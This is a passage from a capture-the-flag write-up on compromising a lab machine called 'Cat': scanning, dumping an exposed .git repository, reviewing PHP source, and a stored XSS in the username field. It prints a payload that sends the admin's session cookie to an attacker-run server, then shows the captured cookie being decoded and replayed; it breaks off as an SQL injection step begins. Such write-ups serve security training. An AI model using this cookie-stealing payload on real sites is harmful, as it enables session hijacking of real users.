+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/7/gBYFf93Ljst5b58XeNKd53hjhC57SgmM9qFvMACECVK0r/Z11ho0Z2xy6i9R5dX2G/HAlIfcu6i2QD9lILOnBmSaHZ22HCjjQKzSbbrnlcIcaEZiE011qtkVmtCd2e5zeVUltA9WCD69pco7BM29OU7FlnMN0iRlF8u962CaRnD4jni/zuiG5C2fcrTHWBxc/RIRELrfJpS3AjJCgEptaa7fsH/XfmOHEkNwOL0ZK0/tdbutmcwWf9dDjV6opyg4IK73UNIJSSak0UXHcCpv0GduF3fep3hmjEwkBgTg/EeZO1IekGssI7yCr0VxvJVz/Gav+snOZ/A1inA5EMqYHGK07B41+0rZo+EZZNbuxlNw/YLQAGuC5tOHt896wZ9tnFeqp3CpFdm2rPGUtFW0jogdda1pRmRy5CNQTPDd6kdtdrZYKqHIWfURmzqva7byzQ1YPjhI22cQ49M79A0yf4yOCPrGlNNzeNJkeZM/LU6p7rNJKxE9CuBAEoyh0=
+|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEmL+UFD1eC5+aMAOZGipV3cuvXzPFlhqtKj7yVlVwXFN92zXioVTMYVBaivGHf3xmPFInqiVmvsOy3w4TsRja4=
+|   256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEOCpb672fivSz3OLXzut3bkFzO4l6xH57aWuSu4RikE
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://cat.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Jul  3 22:47:06 2025 <span class="flag">--</span> 1 IP address (1 host up) scanned in 9.39 seconds
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The scans reveal port <code>22/tcp</code> which is SSH and a web server on <code>80/tcp</code> using Apache. Nmap confirms this is a Linux (Ubuntu) machine.</p>
+<p>The HTTP service on port 80 shows a redirect to <code>cat.htb</code>, so we should add this to our <code>/etc/hosts</code> file.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">echo</span> <span class="string">"10.10.11.53 cat.htb"</span> | <span style="color: #15adff">sudo</span> tee <span class="flag">-a</span> /etc/hosts
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<h1 id="2-gaining-initial-access">2. Gaining Initial Access<a hidden class="anchor" aria-hidden="true" href="#2-gaining-initial-access">#</a></h1>
+<h3 id="footprinting--exploring-the-site">Footprinting &amp; Exploring the Site<a hidden class="anchor" aria-hidden="true" href="#footprinting--exploring-the-site">#</a></h3>
+<p>Visiting <code>http://cat.htb/</code> in a browser, we see a website dedicated to a cat competition.</p>
+<img src="/img/cat/Homepage.png" alt="" class="img-responsive" loading="lazy" />
+<p><code>Wappalyzer</code> confirms the site is running Apache HTTP Server on Ubuntu and uses PHP.</p>
+<img src="/img/cat/Wappalyzer.png" alt="" class="img-responsive" loading="lazy" />
+<h3 id="exploring-the-site">Exploring the site:<a hidden class="anchor" aria-hidden="true" href="#exploring-the-site">#</a></h3>
+
+<div class="ctf-bullet-list">
+    <ul>
+<li>
+<p>The Vote page (<a href="http://cat.htb/vote.php">http://cat.htb/vote.php</a>) indicates voting is closed and buttons are unresponsive.</p>
+  <img src="/img/cat/vote.png" alt="" class="img-responsive" loading="lazy" />
+</li>
+<li>
+<p>The Contest page redirects to <a href="http://cat.htb/join.php">http://cat.htb/join.php</a>, where we can register a new user.</p>
+  <img src="/img/cat/redirect.png" alt="" class="img-responsive" loading="lazy" />
+</li>
+<li>
+<p>After registering, we can access <code>contest.php</code> to register a cat, which involves providing a cat name, age, birthdate, weight, and photo. This looks like a potential area for vulnerabilities like XSS or file upload exploits.</p>
+  <img src="/img/cat/testreg.png" alt="" class="img-responsive" loading="lazy" />
+</li>
+<li>
+<p>But assumptions can lead us into <code>rabbithole</code>. Let&rsquo;s try to recon.</p>
+</li>
+</ul>
+
+</div>
+
+<style>
+.ctf-bullet-list ul {
+    list-style: none;
+    padding-left: 0;
+    margin: 16px 0;
+}
+
+.ctf-bullet-list li {
+    position: relative;
+    padding-left: 32px;
+    margin-bottom: 20px;
+}
+
+.ctf-bullet-list li::before {
+    content: '';
+    position: absolute;
+    left: 4px;
+    top: 6px;
+    width: 12px;
+    height: 12px;
+    background-color: #9fef00;
+    border-radius: 50%;
+    box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    animation: pulse 2s infinite;
+    z-index: 2;
+}
+
+.ctf-bullet-list li::after {
+    content: '';
+    position: absolute;
+    left: 9px;
+    top: 18px;
+    width: 2px;
+    height: calc(100% + 20px);
+    background-color: #6ba600;
+    z-index: 1;
+}
+
+.ctf-bullet-list li:last-child::after {
+    display: none;
+}
+
+.ctf-bullet-list li:only-child::after {
+    display: none;
+}
+
+.ctf-bullet-list li > p {
+    margin: 0 0 8px 0;
+}
+
+.ctf-bullet-list li > p:last-child {
+    margin-bottom: 0;
+}
+
+.ctf-bullet-list li img {
+    margin: 8px 0;
+    max-width: 100%;
+    height: auto;
+}
+
+.ctf-bullet-list li > ul {
+    margin-top: 8px;
+    padding-left: 20px;
+}
+
+.ctf-bullet-list li > ul li::before {
+    background-color: #9fef00;
+    box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    animation: pulse 2s infinite;
+}
+
+.ctf-bullet-list li > ul li::after {
+    background-color: #6ba600;
+}
+
+@keyframes pulse {
+    0% {
+        transform: scale(0.95);
+        box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    }
+    
+    70% {
+        transform: scale(1);
+        box-shadow: 0 0 0 10px rgba(159, 239, 0, 0);
+    }
+    
+    100% {
+        transform: scale(0.95);
+        box-shadow: 0 0 0 0 rgba(159, 239, 0, 0);
+    }
+}
+</style>
+<h3 id="web-enumeration">Web Enumeration<a hidden class="anchor" aria-hidden="true" href="#web-enumeration">#</a></h3>
+<p>We run <code>gobuster</code> to enumerate directories and files on the web server.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">gobuster</span> dir <span class="flag">-u</span> http://cat.htb/ <span class="flag">-w</span> /opt/SecLists/Discovery/Web-Content/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+<span class="indicator-success">[+]</span> Url:                     http://cat.htb/
+<span class="indicator-success">[+]</span> Method:                  GET
+<span class="indicator-success">[+]</span> Threads:                 10
+<span class="indicator-success">[+]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
+<span class="indicator-success">[+]</span> Negative Status codes:   404
+<span class="indicator-success">[+]</span> User Agent:              gobuster/3.6
+<span class="indicator-success">[+]</span> Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.git                 (Status: 301) [Size: 301] [--> http://cat.htb/.git/]
+/.git/HEAD            (Status: 200) [Size: 23]
+/.git/config          (Status: 200) [Size: 92]
+/.git/logs/           (Status: 403) [Size: 272]
+/.git/index           (Status: 200) [Size: 1726]
+/.htaccess            (Status: 403) [Size: 272]
+/.htpasswd            (Status: 403) [Size: 272]
+/.hta                 (Status: 403) [Size: 272]
+/admin.php            (Status: 302) [Size: 1] [--> /join.php]
+/css                  (Status: 301) [Size: 300] [--> http://cat.htb/css/]
+/img                  (Status: 301) [Size: 300] [--> http://cat.htb/img/]
+/index.php            (Status: 200) [Size: 3075]
+/server-status        (Status: 403) [Size: 272]
+/uploads              (Status: 301) [Size: 304] [--> http://cat.htb/uploads/]
+Progress: 4750 / 4750 (100.00%)
+===============================================================
+Finished
+===============================================================
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The <code>gobuster</code> scan reveals an exposed <code>.git/</code> repository and an <code>admin.php</code> page that redirects to <code>join.php</code>. We&rsquo;ll focus on the <code>.git</code> directory and keep <code>admin.php</code> in mind.</p>
+<p>We also run <code>gobuster</code> with the <code>-x php</code> flag and a larger wordlist to find more PHP files.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">gobuster</span> dir <span class="flag">-u</span> http://cat.htb/ <span class="flag">-w</span> /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt <span class="flag">-x</span> php
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+<span class="indicator-success">[+]</span> Url:                     http://cat.htb/
+<span class="indicator-success">[+]</span> Method:                  GET
+<span class="indicator-success">[+]</span> Threads:                 10
+<span class="indicator-success">[+]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt
+<span class="indicator-success">[+]</span> Negative Status codes:   404
+<span class="indicator-success">[+]</span> User Agent:              gobuster/3.6
+<span class="indicator-success">[+]</span> Extensions:              php
+<span class="indicator-success">[+]</span> Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 272]
+/admin.php            (Status: 302) [Size: 1] [--> /join.php]
+/.html                (Status: 403) [Size: 272]
+...SNIP...
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<h3 id="subdomain-enumeration">Subdomain Enumeration<a hidden class="anchor" aria-hidden="true" href="#subdomain-enumeration">#</a></h3>
+<p>We perform subdomain enumeration using <code>ffuf</code> to ensure we don&rsquo;t miss any hidden attack vectors.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">ffuf</span> <span class="flag">-u</span> http://cat.htb/ <span class="flag">-H</span> <span class="string">'Host: FUZZ.cat.htb'</span> <span class="flag">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt <span class="flag">-fl</span> 10
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://cat.htb/
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
+ :: Header           : Host: FUZZ.cat.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response lines: 10
+________________________________________________
+
+:: Progress: [19966/19966] :: Job [1/1] :: 716 req/sec :: Duration: [0:00:31] :: Errors: 0 ::
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The subdomain scan returns no interesting results.</p>
+<h3 id="dumping-git-using-git-dumper">Dumping .git/ using git-dumper<a hidden class="anchor" aria-hidden="true" href="#dumping-git-using-git-dumper">#</a></h3>
+<p>We dump the exposed <code>.git</code> repository to analyze its contents.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">mkdir</span> git-dump; <span style="color: #15adff">git-dumper</span> http://cat.htb/ git-dump/
+[<span>-</span>] Testing http://cat.htb/.git/HEAD [200]
+[<span>-</span>] Testing http://cat.htb/.git/ [403]
+[<span>-</span>] Fetching common files
+[<span>-</span>] Fetching http://cat.htb/.gitignore [404]
+[<span>-</span>] Fetching http://cat.htb/.git/hooks/applypatch-msg.sample [200]
+[<span>-</span>] Fetching http://cat.htb/.git/COMMIT_EDITMSG [200]
+[<span>-</span>] http://cat.htb/.gitignore responded with status code 404
+[<span>-</span>] Fetching http://cat.htb/.git/description [200]
+[<span>-</span>] Fetching http://cat.htb/.git/hooks/commit-msg.sample [200]
+[<span>-</span>] Fetching http://cat.htb/.git/hooks/post-commit.sample [404]
+...SNIP...
+[<span>-</span>] Running git checkout .
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>After dumping the repository, we list the files to see what we&rsquo;ve obtained.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">ls</span> git-dump/
+<span style="color:#00FF00">accept_cat.php  admin.php  config.php  contest.php</span>  <span style="color:rgb(26, 48, 248);font-weight: bold">css</span>  <span style="color:#00FF00">delete_cat.php</span>  <span style="color:rgb(26, 48, 248);font-weight: bold">img  img_winners</span>  <span style="color:#00FF00">index.php  join.php  logout.php  view_cat.php  vote.php</span>  <span style="color:rgb(26, 48, 248);font-weight: bold">winners</span>  <span style="color:#00FF00">winners.php</span>
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Analyzing the source code, we find a potential XSS vulnerability in <code>contest.php</code> where the <code>owner_username</code> from the session is inserted into the database without proper sanitization. This username is then displayed in <code>view_cat.php</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// contest.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Check if $uploadOk is set to 0 by an error
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$uploadOk</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;cat_photo&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="nv">$target_file</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">// Prepare SQL query to insert cat data
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;INSERT INTO cats (cat_name, age, birthdate, weight, photo_path, owner_username) VALUES (:cat_name, :age, :birthdate, :weight, :photo_path, :owner_username)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">// Bind parameters
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindParam</span><span class="p">(</span><span class="s1">&#39;:cat_name&#39;</span><span class="p">,</span> <span class="nv">$cat_name</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_STR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindParam</span><span class="p">(</span><span class="s1">&#39;:age&#39;</span><span class="p">,</span> <span class="nv">$age</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindParam</span><span class="p">(</span><span class="s1">&#39;:birthdate&#39;</span><span class="p">,</span> <span class="nv">$birthdate</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_STR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindParam</span><span class="p">(</span><span class="s1">&#39;:weight&#39;</span><span class="p">,</span> <span class="nv">$weight</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_STR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindParam</span><span class="p">(</span><span class="s1">&#39;:photo_path&#39;</span><span class="p">,</span> <span class="nv">$target_file</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_STR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindParam</span><span class="p">(</span><span class="s1">&#39;:owner_username&#39;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_STR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">// Execute query
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span> <span class="p">(</span><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$success_message</span> <span class="o">=</span> <span class="s2">&#34;Cat has been successfully sent for inspection.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$error_message</span> <span class="o">=</span> <span class="s2">&#34;Error: There was a problem registering the cat.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$error_message</span> <span class="o">=</span> <span class="s2">&#34;Error: There was a problem uploading the file.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>And then in the <code>view_cat.php</code> file, this parameter is retrieved and displayed:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Get the cat_id from the URL
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$cat_id</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cat_id&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cat_id&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$cat_id</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Prepare and execute the query
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT cats.*, users.username FROM cats JOIN users ON cats.owner_username = users.username WHERE cat_id = :cat_id&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$statement</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$statement</span><span class="o">-&gt;</span><span class="na">bindParam</span><span class="p">(</span><span class="s1">&#39;:cat_id&#39;</span><span class="p">,</span> <span class="nv">$cat_id</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$statement</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Fetch cat data from the database
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$cat</span> <span class="o">=</span> <span class="nv">$statement</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$cat</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Cat not found.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Invalid cat ID.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="exploiting-xss-to-get-admin-session">Exploiting XSS to get Admin Session<a hidden class="anchor" aria-hidden="true" href="#exploiting-xss-to-get-admin-session">#</a></h3>
+<p>We&rsquo;ll register a new user with an XSS payload in the username, designed to exfiltrate the <code>PHPSESSID</code> cookie.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="k">this</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">&#34;http://&lt;YOUR IP&gt;:&lt;PORT&gt;/&#34;</span><span class="o">+</span><span class="nx">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="o">&gt;</span>
+</span></span></code></pre></div><p>First, we set up a simple Python web server to capture the exfiltrated cookie.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">php</span> <span class="flag">-S</span> 0.0.0.0:80
+[Thu Jul  3 23:40:54 2025] PHP 8.4.8 Development Server (http://0.0.0.0:80) started
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>We register a new account on <code>http://cat.htb/join.php</code> using the XSS payload as the username and any valid email/password.</p>
+<img src="/img/cat/register.png" alt="" class="img-responsive" loading="lazy" />
+<p>Then, we log in with the newly registered XSS user and navigate to <code>contest.php</code> to register a cat. This action triggers the XSS, as the <code>owner_username</code> (containing our payload) is processed.</p>
+<img src="/img/cat/regcat.png" alt="" class="img-responsive" loading="lazy" />
+<p>On our PHP web server, we capture the base64 encoded cookie:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">php</span> <span class="flag">-S</span> 0.0.0.0:80
+[Thu Jul  3 23:40:54 2025] PHP 8.4.8 Development Server (http://0.0.0.0:80) started
+[Fri Jul  4 00:02:23 2025] 10.10.11.53:36812 [200]: GET /UEhQU0VTU0lEPXM0YWcyaWpkMDA0cWg2YTJwbzMxZm1jNThj
+[Fri Jul  4 00:02:23 2025] 10.10.11.53:36812 Closing                             
+[Fri Jul  4 00:02:23 2025] 10.10.11.53:36818 Accepted                            
+[Fri Jul  4 00:02:23 2025] 10.10.11.53:36818 [200]: GET /UEhQU0VTU0lEPXM0YWcyaWpkMDA0cWg2YTJwbzMxZm1jNThj
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>We decode the captured cookie:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">echo</span> <span class="string">"UEhQU0VTU0lEPTduOTFkcmVnanFqZ2lhdWIzdG9ocGhhcGMy"</span> | <span style="color: #15adff">base64</span> <span class="flag">-d</span> 
+PHPSESSID=7n91dregjqjgiaub3tohphapc2
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>We then use the browser&rsquo;s developer console to change our <code>PHPSESSID</code> cookie to the captured value:</p>
+<img src="/img/cat/setcookie.png" alt="" class="img-responsive" loading="lazy" />
+<p>After refreshing the site, we gain access to the admin panel:</p>
+<img src="/img/cat/admin_panel.png" alt="" class="img-responsive" loading="lazy" />
+<h3 id="sql-injection">SQL Injection<a hidden class="anchor" aria-hidden="true" href="#sql-injection">#</a></h3>
+
+<div class="ctf-bullet-list">
+    <ul>
+<li>
+<p>From the dumped source code, <code>config.php</code> reveals that the application uses SQLite:<br>
+<img src="/img/cat/config.png" alt="" class="img-responsive" loading="lazy" /></p>
+</li>
+<li>
+<p>Further analysis of <code>accept_cat.php</code> shows a SQL Injection vulnerability in the <code>catName</code> parameter.<br>
+<img src="/img/cat/accept_cat.png" alt="" class="img-responsive" loading="lazy" /></p>
+</li>
+<li>
+<p>We intercept a request to <code>accept_cat.php</code> using Burp Suite and save it to a file named <code>accepet_cat.req</code>:<br>
+<img src="/img/cat/intercept_acept.png" alt="" class="img-responsive" loading="lazy" /></p>
+</li>
+</ul>
+
+</div>
+
+<style>
+.ctf-bullet-list ul {
+    list-style: none;
+    padding-left: 0;
+    margin: 16px 0;
+}
+
+.ctf-bullet-list li {
+    position: relative;
+    padding-left: 32px;
+    margin-bottom: 20px;
+}
+
+.ctf-bullet-list li::before {
+    content: '';
+    position: absolute;
+    left: 4px;
+    top: 6px;
+    width: 12px;
+    height: 12px;
+    background-color: #9fef00;
+    border-radius: 50%;
+    box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    animation: pulse 2s infinite;
+    z-index: 2;
+}
+
+.ctf-bullet-list li::after {
+    content: '';
+    position: absolute;
+    left: 9px;
+    top: 18px;
+    width: 2px;
+    height: calc(100% + 20px);
+    background-color: #6ba600;
+    z-index: 1;
+}
+
+.ctf-bullet-list li:last-child::after {
+    display: none;
+}
+
+.ctf-bullet-list li:only-child::after {
+    display: none;
+}
+
+.ctf-bullet-list li > p {
+    margin: 0 0 8px 0;
+}
+
+.ctf-bullet-list li > p:last-child {
+    margin-bottom: 0;
+}
+
+.ctf-bullet-list li img {
+    margin: 8px 0;
+    max-width: 100%;
+    height: auto;
+}
+
+.ctf-bullet-list li > ul {
+    margin-top: 8px;
+    padding-left: 20px;
+}
+
+.ctf-bullet-list li > ul li::before {
+    background-color: #9fef00;
+    box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    animation: pulse 2s infinite;
+}
+
+.ctf-bullet-list li > ul li::after {
+    background-color: #6ba600;
+}
+
+@keyframes pulse {
+    0% {
+        transform: scale(0.95);
